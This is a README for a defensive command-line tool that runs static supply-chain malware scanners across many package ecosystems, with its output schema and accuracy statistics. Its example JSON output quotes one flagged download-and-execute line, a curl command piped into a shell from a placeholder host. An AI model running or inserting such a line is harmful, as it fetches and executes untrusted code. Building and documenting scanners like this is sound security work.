# supply-chain-audit

[![Tests](https://github.com/eltociear/supply-chain-audit/actions/workflows/tests.yml/badge.svg)](https://github.com/eltociear/supply-chain-audit/actions/workflows/tests.yml)

**One CLI over 24 small supply-chain malware scanners - one per place where someone else's
code runs on your machine before you call it.**

[![60-second demo on YouTube](https://img.youtube.com/vi/CIgleGpAZkY/hqdefault.jpg)](https://www.youtube.com/watch?v=CIgleGpAZkY)

▶ **[Watch the 60-second demo](https://www.youtube.com/watch?v=CIgleGpAZkY)**

`npm install` can run lifecycle scripts. `pip install` can run build backends and legacy
`setup.py` hooks. `cargo build` runs `build.rs`.
Opening a repo in VS Code can run `.vscode/tasks.json`; enabling an Obsidian plugin runs
`main.js` with full Node access; `from_pretrained(trust_remote_code=True)` runs whatever the
model repo ships. These behaviours may have no published advisory, so CVE-only scanners can
miss them. The
[eltociear/*-audit](#the-family) scanners do: each one is a single-file, zero-dependency
Python script that reads (never runs) one ecosystem's install/load-time code and scores it
with context rules calibrated on thousands of real popular packages.

`sca` puts them behind one command:

- `sca scan .` finds every ecosystem in a directory tree and runs the matching scanners;
- every scanner's output is normalised into **one JSON schema** and **SARIF 2.1.0**;
- `--fail-on` gates CI (exit 2), the same way for all 24.

Zero dependencies, Python 3.9+, MIT. The scanners are vendored under [`scanners/`](scanners)
at pinned upstream commits ([`scanners/VERSIONS.json`](scanners/VERSIONS.json)) and each runs
in its own isolated `python -I` subprocess - `sca` never imports them.

## Install

From a checkout (nothing to install, works today):

```sh
git clone https://github.com/eltociear/supply-chain-audit && cd supply-chain-audit
python3 sca.py --version
```

From PyPI, **after the first release** (the package name `supply-chain-audit` is not published
yet; see [RELEASING.md](RELEASING.md)):

```sh
pipx install supply-chain-audit                   # puts `sca` on your PATH
uvx --from supply-chain-audit sca scan .           # or run it once without installing
pip install supply-chain-audit                     # into the current environment
```

The wheel is pure Python with zero dependencies and carries the same vendored scanners (under
`sca_scanners/` in site-packages, found automatically; `SCA_SCANNER_DIR` overrides). The
scanners' test trees (inert canaries) are not packaged; run the test suite from a checkout.
With an installed `sca`, replace `python3 sca.py` with `sca` below.

## Quick start

```sh
python3 sca.py scan ~/src/some-checkout          # detect + scan everything, human-readable
python3 sca.py scan . --sarif -o sca.sarif       # SARIF for GitHub code scanning / any SARIF viewer
python3 sca.py scan . --json --fail-on medium    # normalised JSON, exit 2 on MEDIUM or worse
python3 sca.py scan . --deps                     # also resolve lockfiles against the registries (network)
python3 sca.py npm left-pad@1.3.0                # one scanner, any of its own arguments
python3 sca.py list                              # the 24 ecosystems
```

Nothing is installed, built or executed from the scanned tree. Without `--deps`, `sca scan`
is offline: it scans what is on disk and only *lists* the dependency manifests it saw
(`package-lock.json`, `requirements*.txt`, `Gemfile.lock`, `go.mod` requires, `composer.lock`,
`Cargo.lock`, `*.csproj`, `packages.lock.json`) as `skipped`. With `--deps` those are handed to
the scanners' registry modes, and GitHub workflows have their `uses:` actions fetched and
scanned too.

## Commands

| Command | What it does |
|---|---|
| `sca scan <dir\|file> [...]` | auto-detect (below) and run every matching scanner; `--only npm,pypi`, `--skip repo-trust`, `--dry-run` (print the plan), `--deps`, `-j N` (default 2 concurrent scanners) |
| `sca <ecosystem> <target> [args]` | pass-through to one scanner: every argument except sca's own output options goes to the scanner unchanged (`sca crate serde --build-only`, `sca vsix --openvsx publisher.name`, `sca hf --hf org/model --auto-map`) |
| `sca <ecosystem> ... --raw` | exec the scanner with its native output and exit code |
| `sca list [--json]` | ecosystems, scanners, pinned commits |
| `sca help <ecosystem>` | the scanner's own usage text plus sca's notes on its quirks |

Output options for every command: `--json`, `--sarif`, `-o FILE`, `--fail-on low|medium|high|critical|none`
(default `high`), `--timeout SEC` (per scanner, default 600), `-v`.

Ecosystem names also accept the repo name and aliases (`cargo`, `go`, `composer`, `gem`, `pip`,
`actions`, `vscode`, `brew`, `scoop`/`winget`/`choco`, `wp`, `nvim`, `huggingface`, `dotnet`, `tf` ...).

### Exit codes

| Code | Meaning |
|---|---|
| 2 | at least one result's `max_severity` reached `--fail-on` (this wins even if another scanner errored, so a finding is never masked) |
| 1 | nothing reached `--fail-on`, but there was a usage error, nothing was recognised, or any scanner returned an error (fail-closed, also with `--fail-on none`) |
| 0 | nothing reached `--fail-on` and every scanner completed |

## Use in GitHub Actions

`action.yml` at the repository root is a composite action (no Docker): it sets up Python
(without touching the job's own Python), runs `sca scan --sarif`, uploads the SARIF to code
scanning, and fails the step when something reaches `fail-on`.

```yaml
name: supply-chain-audit
on: [push, pull_request]
permissions:
  contents: read
  security-events: write   # for the SARIF upload; without it the upload is skipped with a warning
jobs:
  sca:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
      - uses: eltociear/supply-chain-audit@v0.2.0   # placeholder: pin a full commit SHA, see below
        with:
          path: .
          fail-on: high
```

| Input | Default | Meaning |
|---|---|---|
| `path` | `.` | directory or file to scan |
| `fail-on` | `high` | `low` / `medium` / `high` / `critical` / `none` |
| `sarif-file` | `sca.sarif` | where the SARIF report is written |
| `deps` | `false` | `true` adds `--deps` (lockfiles against the registries, referenced actions fetched; network) |
| `extra-args` | | more `sca scan` arguments, split on whitespace (`--skip repo-trust -j 3`) |
| `upload-sarif` | `true` | upload to code scanning (`continue-on-error`, so a token without `security-events: write`, e.g. on fork PRs, only warns) |
| `python-version` | `3.12` | Python that runs sca (3.9+) |

Outputs: `exit-code` (0 / 1 / 2 as in [Exit codes](#exit-codes)), `max-severity` (SAFE ... CRITICAL,
ERROR, NONE), `sarif-file`. Use `continue-on-error: true` on the step and read
`steps.<id>.outputs.exit-code` if you want to gate on it yourself.

**Pin a SHA.** `@v0.2.0` above is a placeholder until a release is tagged; tags can be moved, and
a supply-chain scanner is exactly the kind of step an attacker would like to swap. Pin the full
commit (`uses: eltociear/supply-chain-audit@<40-hex-sha> # v0.2.0`; `gh api
repos/eltociear/supply-chain-audit/commits/v0.2.0 --jq .sha` once the tag exists). Every action
this one uses is itself pinned by SHA. [`action-selftest.yml`](.github/workflows/action-selftest.yml)
runs it on a benign fixture (must pass) and an inert canary (must fail with exit 2) on every push.

## What `sca scan` detects

| Ecosystem | Marker(s) | Target handed to the scanner |
|---|---|---|
| `npm` | `package.json` (not `node_modules/`) | the package dir; `package-lock.json` / `npm-shrinkwrap.json` with `--deps` |
| `pypi` | `setup.py`, `pyproject.toml`, `setup.cfg`, `*.whl`, `*.pth` | the project dir / file; `requirements*.txt` with `--deps` |
| `rubygems` | `*.gemspec`, `*.gem` | the gem dir / file; `Gemfile.lock` with `--deps` |
| `gomod` | `go.mod` | the module dir; its requires with `--deps` |
| `packagist` | `composer.json` | the package dir (a `vendor/` inside is scanned per package); `composer.lock` with `--deps` |
| `crate` | `Cargo.toml`, `*.crate` | the crate dir; `Cargo.lock` with `--deps` |
| `terraform` | `*.tf`, `*.tf.json` | each module dir |
| `gha` | `action.yml` / `action.yaml`; `.github/workflows/*.yml` | the action dir; each workflow (pinning offline, referenced actions fetched with `--deps`) |
| `browserext` | `manifest.json` with `manifest_version`; `*.crx`, `*.xpi` | the unpacked extension / package |
| `vsix` | `package.json` with `engines.vscode`; `*.vsix` | the extension (instead of `npm`) |
| `obsidian` | `manifest.json` with `id` + `minAppVersion` | the plugin dir |
| `hacs` | `hacs.json`; `manifest.json` with `domain` + `iot_class`/`codeowners`/... | the repo (absorbs its `custom_components/*`) or the component dir |
| `blender` | `blender_manifest.toml`; `__init__.py` defining `bl_info` | the add-on / extension dir |
| `comfyui` | `__init__.py` exporting `NODE_CLASS_MAPPINGS`; `[tool.comfy]` | the node dir |
| `userscript` | `*.user.js`; `*.js` with a `// ==UserScript==` header | each script |
| `aur` | `PKGBUILD` | the package dir |
| `homebrew` | `Formula/`, `Casks/`, `HomebrewFormula/`; `*.rb` with `< Formula` / `cask "..."` | the dir / each file |
| `winpkg` | Scoop manifest JSON; winget manifest (`PackageIdentifier` + `ManifestVersion`); `tools/chocolateyInstall.ps1` | each manifest / the Chocolatey package dir |
| `nuget` | `*.nuspec` (not Chocolatey), `*.nupkg`, `build/*.props\|targets`; `*.csproj` / `packages.lock.json` with `--deps` | the package dir / file |
| `mcp` | `@modelcontextprotocol/sdk` / `fastmcp` / `mcp` dependency, `server.json`, `smithery.yaml` | the server dir (entry files picked like `mcp-audit --github`) |
| `wordpress` | a `*.php` with a `Plugin Name:` header | the plugin dir |
| `vimplugin` | `plugin/`, `autoload/`, `ftplugin/`, `rplugin/`, `denops/` with code; `lua/` + `doc/` | the plugin dir |
| `hf` | `config.json` (or tokenizer/processor config) with `auto_map` | the model snapshot dir |
| `repo-trust` | at the scan root: `.vscode/`, `.claude/`, `.cursor/`, `.devcontainer`, `.envrc`, `AGENTS.md`/`CLAUDE.md`, `.mcp.json`, `.gitmodules`, `Makefile`, `package.json` ... | the checkout root |

Pruned while walking: `.git`, `node_modules`, `vendor`, `target`, `.venv`/`venv`, `__pycache__`,
`.terraform`, other dot-dirs except `.github`; depth 8. One directory can match several
ecosystems (a Python MCP server is both `pypi` and `mcp`) and then gets every matching scanner.

## Output

### Normalised JSON (`--json`)

Documented in [`schema/sca-report.schema.json`](schema/sca-report.schema.json). Shape:

```jsonc
{
  "schema_version": 1, "sca_version": "0.1.0", "generated": "2026-11-27T09:00:00Z",
  "mode": "scan", "root": ".",
  "summary": {"results": 6, "by_verdict": {"SAFE": 5, "CRITICAL": 1}, "max_severity": "CRITICAL",
              "fail_on": "HIGH", "failed": true, "errors": 0, "ecosystems": ["npm", "pypi"]},
  "detected": [{"ecosystem": "npm", "target": "./web", "reason": "package.json", "network": false}],
  "skipped":  [{"ecosystem": "npm", "target": "./package-lock.json", "reason": "... - needs --deps"}],
  "results": [{
    "tool": "npm-audit", "tool_commit": "cfa1e2b4...", "ecosystem": "npm", "target": "./web",
    "verdict": "CRITICAL",          // the scanner's own risk_level, or ERROR
    "max_severity": "CRITICAL",     // max(verdict, every finding) - what --fail-on gates on
    "risk_score": 40, "info_count": 3, "error": null,
    "findings": [{"severity": "CRITICAL", "rule": "download_execute", "name": "Download & Execute",
                  "file": "package.json#scripts.preinstall", "line": 1,
                  "message": "Download & Execute: Fetches remote content and pipes it straight into a shell/interpreter",
                  "context": "curl -s https://example.invalid/x.sh | sh", "matched": "...", "extra": {}}],
    "command": ["npm_audit.py", "./web", "--json"], "seconds": 0.4, "scanner_exit_code": 2
  }]
}
```

### SARIF (`--sarif`)

SARIF 2.1.0 with **one run per scanner** (`tool.driver.name` = the scanner repo, `version` = the
vendored commit). Rules carry `security-severity` (CRITICAL 9.5, HIGH 8.0, MEDIUM 5.0, LOW 2.0) so
GitHub code scanning sorts them; CRITICAL/HIGH map to `error`, MEDIUM to `warning`, LOW to `note`.
Each run's `invocations` records the command line and any scanner error; `properties.targets` lists
every target with its verdict, so a SAFE target is visible too.

### Adapter table

The scanners share a contract (`--json` anywhere; one object or a list; `risk_level`, `findings[]`
with `severity`/`id`/`name`/`description`/`file`/`line`/`matched`/`context`; errors as SAFE + `error`;
exit 2 on HIGH+) and a newer family envelope (`schema: "eltociear-audit/1"`, `results[]`) that is
being rolled out repo by repo. `sca` reads both. The per-scanner deviations it maps
(`sca help <ecosystem>` prints them; the source of truth is `ADAPTERS` in [`sca.py`](sca.py)):

| Scanner | Quirk | What sca does |
|---|---|---|
| mcp-audit | older builds: no directory mode, `--json` is always a bare list, no `--help` (it would open a file called `--help`) | picks the entry files itself with the same selection `mcp-audit --github` uses (manifests, `package.json` main/bin mapped back to `src/`, `*server*`/`*tool*`/`index`/`main` sources, max 10); `sca help mcp` runs it with no arguments. Builds that scan `<dir>` themselves get the dir |
| winpkg-audit | Chocolatey findings put the file in `line` as `"chocolateyInstall.ps1:L12"`; a directory expands into one result per manifest | split into `file` + `line`; results kept per manifest |
| homebrew-audit | findings have no `file` (one formula per result) | SARIF location falls back to the target |
| userscript-audit | `--json` is always a list; no `total_findings`/`info_count`; fetch errors are only printed to stderr and the target is dropped | `info_count` from `info[]`; an empty result list becomes an ERROR result |
| wordpress-audit | no `total_findings`/`info_count`; extra `naive_flags`/`vendor_hosts` | `info_count` from `info[]` |
| hf-code-audit, blender-audit | fetch errors come back as `risk_level: "ERROR"` instead of SAFE + `error` | both shapes map to verdict ERROR |
| obsidian-, blender-, hf-code-, repo-trust-audit | a missing local path exits 1 with no JSON | reported as an ERROR result, sca exits 1 |
| aur, homebrew, npm, pypi, crate, gomod, rubygems, packagist, terraform, wordpress, comfyui, hacs, vimplugin | an argument that is not an existing path is fetched from the registry / GitHub | `sca scan` only passes paths that exist; pass-through is yours to direct |
| gha-audit | a workflow fetches every referenced action unless `--no-fetch` | `sca scan` adds `--no-fetch` unless `--deps` |
| nuget-audit | a `.csproj` / `packages.lock.json` target resolves PackageReferences on nuget.org | only with `--deps` |
| pypi-audit | `file` is prefixed `sdist:` / `wheel:`; npm-audit uses `package.json#scripts.x` | kept in JSON; stripped for SARIF artifact URIs |
| all | finding `line` 0 for file-level / combination findings | `line: null` (SARIF region omitted) |

## The family

Every scanner was built the same way: rules written against inert reconstructions of real
incidents (the canaries in each repo's `tests/`), then **calibrated** on a corpus of real popular
packages, then the rules were **frozen in a commit** and run once, blind, on a disjoint
**held-out** corpus. The held-out column is the number to quote. *Alerts* are every HIGH/CRITICAL
on the held-out set; *misfires* are the ones whose match was wrong (the rest were correct pattern
matches with benign intent - e.g. an integration that legitimately sends a token to its own
cloud - which a human still has to look at). Every number below is extracted by
[`scripts/gen_stats.py`](scripts/gen_stats.py) from each repo's FINDINGS.md / RECALL.md at the
vendored commit (linked), through literal quotes kept in
[`scripts/family_sources.json`](scripts/family_sources.json); if a doc changes so that a quote no
longer matches, the generator fails instead of letting this table drift.
[`family_stats.json`](family_stats.json) has the same numbers machine-readable, with source notes.

<!-- gen_stats:family-table -->
| `sca` key | Scanner | What runs at install / load time | Calibration n | Held-out n | Held-out HIGH+ alerts | of which misfires (FP) | Canaries / benign controls | Numbers from |
|---|---|---|---:|---:|---:|---:|---:|---|
| `aur` | [aur-audit](https://github.com/eltociear/aur-audit) | PKGBUILD at makepkg; .install scriptlets + alpm hooks as root at pacman install | 2,000 | 1,000 | 3 (0.30%) | 1 (0.10%) | 17 / 5 | [`649d438`](https://github.com/eltociear/aur-audit/blob/649d438ccd00244354e0343489654f8c83636e4a/FINDINGS.md) |
| `blender` | [blender-audit](https://github.com/eltociear/blender-audit) | register()/module body at add-on enable, app handlers; Python embedded in .blend (Auto Run) | 1,130 | 613 | 1 (0.16%) | 1 (0.16%) | 19 / 12 | [`ff5c4af`](https://github.com/eltociear/blender-audit/blob/ff5c4afa1f981f6c2da1bc2d1805d072442c7222/FINDINGS.md) |
| `browserext` | [browserext-audit](https://github.com/eltociear/browserext-audit) | background/content scripts on install and on every page load | 896 | 698 | 1 (0.14%) | 0 (0.00%) | 16 / 9 | [`c9ef8c5`](https://github.com/eltociear/browserext-audit/blob/c9ef8c57e7023001e4963cf021d7b2241e9f667c/FINDINGS.md) |
| `comfyui` | [comfyui-audit](https://github.com/eltociear/comfyui-audit) | __init__.py / prestartup_script.py at ComfyUI startup; install.py + requirements at node install | 999 | 497 | 0 (0.00%) | 0 (0.00%) | 17 / 8 | [`fca8297`](https://github.com/eltociear/comfyui-audit/blob/fca829744d2bd1b1f1e3051903f44576f0f7bcd4/FINDINGS.md) |
| `crate` | [crate-audit](https://github.com/eltociear/crate-audit) | build.rs + proc-macros at cargo build | 800 | 799 | 1 (0.13%) | 1 (0.13%) | 19 / 6 | [`824b5e4`](https://github.com/eltociear/crate-audit/blob/824b5e4f23f9f5b4f06b4117215a74796d041241/FINDINGS.md) |
| `gha` | [gha-audit](https://github.com/eltociear/gha-audit) | action main/pre/post entrypoints and Docker build on the CI runner | 1,443 | 665 | 1 (0.15%) | 1 (0.15%) | 12 / 10 | [`4d69458`](https://github.com/eltociear/gha-audit/blob/4d694584c6746f2589b38da7a3b1af3cdee81b55/FINDINGS.md) |
| `gomod` | [gomod-audit](https://github.com/eltociear/gomod-audit) | init() / package var initialisers at import; cgo; go generate | 1,152 | 735 | 0 (0.00%) | 0 (0.00%) | 13 / 11 | [`cab5376`](https://github.com/eltociear/gomod-audit/blob/cab5376de03ca12b5e836d378bffbde078fefe2f/FINDINGS.md) |
| `hacs` | [hacs-audit](https://github.com/eltociear/hacs-audit) | integration Python imported/set up inside Home Assistant; card JS in the frontend; requirements pip-installed | 1,694 | 850 | 1 (0.12%) | 0 (0.00%) | 16 / 12 | [`95a24b7`](https://github.com/eltociear/hacs-audit/blob/95a24b78468ea70bda995ce2369aa7f6806967cd/FINDINGS.md) |
| `hf` | [hf-code-audit](https://github.com/eltociear/hf-code-audit) | auto_map modeling/tokenizer code at import under from_pretrained(trust_remote_code=True) | 999 | 500 | 4 (0.80%) | 3 (0.60%) | 12 / 7 | [`ce0c52a`](https://github.com/eltociear/hf-code-audit/blob/ce0c52ab8a0e9ba79479682f73cc0433bd1c03a0/FINDINGS.md) |
| `homebrew` | [homebrew-audit](https://github.com/eltociear/homebrew-audit) | formula/cask Ruby install hooks (postflight etc.) at brew install | 16,593 | – | no held-out split | no held-out split | 12 / 2 | [`a010fde`](https://github.com/eltociear/homebrew-audit/blob/a010fde8739e53b367afd018cfb46749280c32f3/FINDINGS.md) |
| `mcp` | [mcp-audit](https://github.com/eltociear/mcp-audit) | server code + tool descriptions the agent reads/runs when the server is launched | 1,060 | – | no held-out split | no held-out split | 23 / 31 | [`bf1cd66`](https://github.com/eltociear/mcp-audit/blob/bf1cd6624f806a320c2f5be582c8855fc6069f2e/FINDINGS.md) |
| `npm` | [npm-audit](https://github.com/eltociear/npm-audit) | preinstall/install/postinstall scripts; node code loaded inside n8n / Node-RED (holding all workflow credentials) | 3,370 | 2,277 | 9 (0.40%) | 0 (0.00%) | 28 / 15 | [`80f0877`](https://github.com/eltociear/npm-audit/blob/80f08775f2731f3826cc181781ad7c4d0f19e9a8/FINDINGS.md) |
| `nuget` | [nuget-audit](https://github.com/eltociear/nuget-audit) | auto-imported build/*.props/.targets (<Exec>, inline tasks) at dotnet build/restore; tools/install.ps1 / init.ps1 | 1,500 | 700 | 0 (0.00%) | 0 (0.00%) | 14 / 9 | [`4038987`](https://github.com/eltociear/nuget-audit/blob/403898705f850754b6c7c2a9b6478e12d31fa4da/FINDINGS.md) |
| `obsidian` | [obsidian-audit](https://github.com/eltociear/obsidian-audit) | main.js at plugin enable (Electron, full Node.js) | 1,476 | 950 | 0 (0.00%) | 0 (0.00%) | 17 / 4 | [`f2b411b`](https://github.com/eltociear/obsidian-audit/blob/f2b411b1cbc9d52f6c8513f20e324437b0ea1b81/FINDINGS.md) |
| `packagist` | [packagist-audit](https://github.com/eltociear/packagist-audit) | composer-plugin at composer install; autoload.files on every request; Laravel providers / Symfony bundles at boot | 1,263 | 799 | 2 (0.25%) | 2 (0.25%) | 17 / 13 | [`1ccd78b`](https://github.com/eltociear/packagist-audit/blob/1ccd78b7cf7e25040979786c14945fed52a7f2be/FINDINGS.md) |
| `pypi` | [pypi-audit](https://github.com/eltociear/pypi-audit) | setup.py / PEP 517 backend / build hooks at pip install; .pth import lines at every interpreter start | 1,375 | 800 | 2 (0.25%) | 2 (0.25%) | 25 / 20 | [`71db916`](https://github.com/eltociear/pypi-audit/blob/71db9166b5f9f7b45805b99553f8921ec3abb5c0/FINDINGS.md) |
| `repo-trust` | [repo-trust-audit](https://github.com/eltociear/repo-trust-audit) | agent hooks, .envrc, devcontainer initializeCommand, folder-open tasks, auto-approved MCP servers when a repo is opened/trusted | 1,000 | 328 | 1 (0.30%) | 0 (0.00%) | 17 / 8 | [`693e6de`](https://github.com/eltociear/repo-trust-audit/blob/693e6de22ed4603655255464ec8eb57b0d9edb9a/FINDINGS.md) |
| `rubygems` | [rubygems-audit](https://github.com/eltociear/rubygems-audit) | extconf.rb / mkrf_conf at gem install; rubygems_plugin.rb on every gem command; top-level lib code at require | 1,334 | 812 | 1 (0.12%) | 1 (0.12%) | 20 / 10 | [`3c26250`](https://github.com/eltociear/rubygems-audit/blob/3c26250ffa56c703e66f8b4b1c03d50184406777/FINDINGS.md) |
| `terraform` | [terraform-audit](https://github.com/eltociear/terraform-audit) | data "external" / "http" at terraform plan; provisioner local-exec at apply | 994 | 695 | 0 (0.00%) | 0 (0.00%) | 13 / 9 | [`75302cc`](https://github.com/eltociear/terraform-audit/blob/75302cc8292e3f3e5e3392f853b24a4473caefe6/FINDINGS.md) |
| `userscript` | [userscript-audit](https://github.com/eltociear/userscript-audit) | script body on every matching page load (@match), with GM_* privileges | 1,498 | 700 | 1 (0.14%) | 1 (0.14%) | 21 / 9 | [`c994872`](https://github.com/eltociear/userscript-audit/blob/c9948725947b6a5b9d59c006241367b4c63f6d00/FINDINGS.md) |
| `vimplugin` | [vimplugin-audit](https://github.com/eltociear/vimplugin-audit) | plugin/, after/plugin/, ftdetect/ at every editor startup; build/do/run hooks + install.sh at plugin install | 1,199 | 698 | 1 (0.14%) | 1 (0.14%) | 15 / 12 | [`1c67aea`](https://github.com/eltociear/vimplugin-audit/blob/1c67aea8b60c1c03b41729156407a4b12d793bce/FINDINGS.md) |
| `vsix` | [vsix-audit](https://github.com/eltociear/vsix-audit) | extension activate() (esp. '*' / onStartupFinished) as unsandboxed Node.js | 937 | 893 | 10 (1.12%) | 7 (0.78%) | 20 / 20 | [`7b82c36`](https://github.com/eltociear/vsix-audit/blob/7b82c369dc7a43a060a614c75248d68ece60a4f9/FINDINGS.md) |
| `winpkg` | [winpkg-audit](https://github.com/eltociear/winpkg-audit) | Scoop pre_install/post_install/installer.script PowerShell; chocolateyInstall.ps1; winget installers at install | 57,554 | 58,157 | not reported | 1 class (count not reported) | 20 / 3 | [`57ecb01`](https://github.com/eltociear/winpkg-audit/blob/57ecb013ff09c3fd16eba8b9a35afd8a8267c59a/FINDINGS.md) |
| `wordpress` | [wordpress-audit](https://github.com/eltociear/wordpress-audit) | plugin PHP on activation and on every request | 1,200 | 800 | 2 (0.25%) | 2 (0.25%) | 11 / 13 | [`af988dd`](https://github.com/eltociear/wordpress-audit/blob/af988ddbae8d1856164fcfe781fdd8cfa9522fe3/FINDINGS.md) |

Pooled over the 21 scanners with a held-out split and a reported count (all except homebrew, mcp, winpkg): **41 (0.24%) HIGH+ alerts and 23 (0.14%) misfires on 16,809 never-seen popular packages**.

vsix-audit's row is its fresh held-out set 3, scanned once with the frozen v0.2.0 engine (Open VSX ranks 946-1449 + VS Code Marketplace top). The v0.1.0 engine had 17/595 (2.9%) on held-out sets 1+2, all benign shapes; those sets were then folded into calibration.

homebrew-audit and mcp-audit were calibrated without a held-out split; winpkg-audit's held-out half (58,157 Scoop + winget manifests) surfaced one more misfire class without a manifest count, so it is left out of the pool.

What the corpora showed, in aggregate (no package is named here):

- **aur**: 0 CRITICAL across 3,300 packages, incl. a 300-package sample of the June 2026 campaign list (no live indicators); context-blind signatures flag 13.9% (cal) / 8.8% (held-out) HIGH+ vs 0.05% / 0.3% calibrated.
- **blender**: 0 malicious add-ons in 1,743 (1,243 extensions.blender.org ids + 500 GitHub repos); ~20% of add-ons trip HIGH+ with context-free signatures.
- **browserext**: no theft/RCE shape in 1,594 popular extensions (1,000 AMO + 594 Chrome); 14% of popular extensions hold the cookies + every-site permission pair; first-draft rules gave 23 HIGH on calibration, 0 after tuning.
- **comfyui**: 0 HIGH+ in 1,496 nodes (top 1,000 by stars + random 500); first draft flagged 5 of the first 51 nodes (9.8%) HIGH+, all false positives.
- **crate**: 346 of the top 1,599 crates (21.6%) run code during cargo build (217 build scripts, 140 proc-macros); 0 HIGH+ on the top 1,599 after the one held-out fix.
- **gha**: naive context-free rules flag 46.5% (cal) / 35.8% (held-out) of actions HIGH; 53 actions had no entrypoint at the scanned ref (dist/ only on release tags); 115 actions declare pre:/post: hooks; 60 Docker actions run a prebuilt docker:// image.
- **gomod**: 77% (cal) / 67% (held-out) of popular modules have a non-test init(), i.e. run code on import; 0 HIGH+ on the single blind held-out run; 7 calibration first-pass FPs fixed by context rules.
- **hacs**: 0 malicious integrations/cards in 2,544 scanned; about two-thirds of declared Python requirements float (unpinned).
- **hf**: 1 in 500 held-out repos carried a credential harvester (flagged CRITICAL by the frozen rules); top 1,000 had none; 10.1% pull code from a repo in another namespace via auto_map (6.0% have no Python of their own).
- **homebrew**: official repos clean: 0 CRITICAL over 16,593 packages; 6 HIGH (http:// + sha256 :no_check); 651 third-party casks (11.1%) strip macOS quarantine in install hooks, across 6 taps; 7 of 139 third-party taps have >=1 HIGH/CRITICAL.
- **mcp**: 0 malicious servers in 1,060; overall FP rate 8/1,060 = 0.75% (0.57% HIGH/CRITICAL only); of 1,510 registry repos processed, 17.7% no longer exist and 12.1% contain no server source.
- **npm**: 83 of the top ~2,000 npm packages run code on npm install; 0 HIGH+ on 680 top packages; in 4,967 n8n/Node-RED nodes no stealer/worm/revshell/wiper, and 0 of the remaining HIGH+ are false.
- **nuget**: 18.1% ship build files; 9.9% have a target that runs automatically; 0 have network primitives in a build target; 0 malicious build/install code in 2,758 packages.
- **obsidian**: naive rules flag 39.3% (cal) / 24.7% (held-out) HIGH+; 21.7% of plugins read the whole vault and talk to the network; 2 calibration HIGHs were real obfuscation.
- **packagist**: about a third of popular packages run code without being called (35.1% cal / 27.5% held-out); only 3 of 86 composer-plugins do statically visible network I/O.
- **pypi**: 46% of the calibration set ships build-time code pip may run; 12% are sdist-only; 20 packages (1.5%) ship a .pth in the installed wheel that runs at every interpreter start; build-time network I/O is rare: 6 packages (0.5%).
- **repo-trust**: 10.8% of 1,328 qualifying popular repos ship something that runs automatically once the folder is opened/trusted; 263 hook commands in 74 repos with Claude Code hooks; 198 call a script inside the repo; zero invisible-Unicode payloads in any surface.
- **rubygems**: 5.3% of the top 3,999 gems declare an extension that runs at gem install; 10 gems (0.25%) ship rubygems_plugin.rb, which runs on every gem command.
- **terraform**: about 1 in 20 popular modules runs a program at terraform plan (5.3% cal / 4.0% held-out); 10.7% (cal) run any local code at plan or apply; 0 send env/credentials/state anywhere.
- **userscript**: context-blind rules flag ~18% of top scripts, all false positives; 0 credential harvesters / clipboard hijackers / miners in 2,198 scripts; 3 calibration HIGHs are real remote-loader/obfuscation patterns.
- **vimplugin**: a context-free grep of dangerous APIs flags 56-65% of plugins; calibrated engine 0-0.14% HIGH+; about half of popular plugins run shell commands.
- **vsix**: on a fresh never-seen set of 893 extensions the frozen v0.2.0 engine flagged 10 (1.1%), of which 7 (0.8%) were false positives; the three true findings post data to a public request bin; the v0.1.0 engine needed a human look on ~1 in 35 never-seen extensions (held-out 3.0% / 2.7%), all benign shapes; no GlassWorm-style payloads in 936 popular extensions.
- **winpkg**: 44% of Scoop manifests (43,988) carry install-time PowerShell; official sources nearly clean (Scoop official 6/6,508, winget 0/16,502 HIGH+); after calibration every remaining HIGH+ is a true pattern match; 6 distinct Scoop apps download-and-run from install hooks; 5 add Defender exclusions.
- **wordpress**: naive rule set flags 58.7% (cal) / 48.4% (held-out); calibrated engine 0 / 0.25% HIGH+; 0 malicious plugins in the 2,000 most-installed.
<!-- /gen_stats:family-table -->

## Recall on real malware

The false-positive numbers above say how often a scanner is wrong about benign code. Recall -
how much real malware it catches - was until wave 5 measured only on each repo's own canaries,
which prove a rule fires on the shape it was written for and nothing more. Eight scanners now
also have a recall measurement on **real, already-removed malicious artifacts**, scanned
statically (never installed, built or run; no sample is stored in any repo; each repo keeps a
manifest of names, versions and hashes of removed, publicly documented samples only). The same
protocol as the FP numbers: tune on one split, freeze the rules in a commit, scan a disjoint
held-out split once.

How to read the table:

- **before** is the engine as it was published before it saw any of these samples, so every
  "before" number is a blind measurement.
- **after** in the *blind* column is the frozen engine on samples it never saw. **These are the
  recall numbers to quote.**
- **after** in the *tuned on* column was measured on the very samples the rules were fixed
  against. It shows the fix works on those shapes; it is **not** a recall estimate, and a new
  campaign should be expected to land nearer the blind numbers.
- Real-malware sets (npm, pypi) are large, deduplicated and family-disjoint. Incident replays
  (gha, gomod, rubygems, packagist, crate) are whatever real copies survived registry takedowns:
  small, correlated and dominated by a few campaigns, so several are smoke tests, not rates.
- Every rule change was re-checked on a re-fetched benign corpus (last column) so that recall was
  not bought with precision.

<!-- gen_stats:recall -->
**Blind held-out recall, HIGH+, engine before → frozen rules:** `crate` 15/38 (39.5%) → **15/38 (39.5%)**; `gha` 34/34 (100%) → **34/34 (100%)**; `gomod` 1/2 (50%) → **2/2 (100%)**; `npm` 157/267 (58.8%) → **196/267 (73.4%)**; `packagist` 0/1 (0%) → **0/1 (0%)**; `pypi` 112/207 (54.1%) → **159/210 (75.7%)**; `rubygems` – → **0/2 (0%)**; `vsix` 3/17 (17.6%) → **4/17 (23.5%)**.

| `sca` key | Evidence | **Blind: frozen rules on samples they never saw**, HIGH+ before → after | Tuned on (after = not a recall estimate), HIGH+ before → after | Benign re-check, HIGH+ before → after |
|---|---|---|---|---|
| `crate` | real malware: removed crates.io malware recovered from a non-deleting mirror (RustSec / OSV MAL- list, 2021-2026) (122 samples, 86 distinct); unit: payload files; [report](https://github.com/eltociear/crate-audit/blob/824b5e4f23f9f5b4f06b4117215a74796d041241/RECALL.md) | all, original rules (fully blind): 23/86 (26.7%)<br>late-tune (recovered after the freeze), n=23: 2/23 (8.7%) → **12/23 (52.2%)** (never seen by the frozen rules, but pre-2026 incidents like the tune split)<br>held-out (every 2026 incident), n=38: 15/38 (39.5%) → **15/38 (39.5%)** (the tune-split rules generalised to none of the 2026 incidents) | tune, n=25: 6/25 (24%) → 25/25 (100%) | 1 → 0 of 2,098 (top 2,098 crates re-fetched (the original calibration corpus)) |
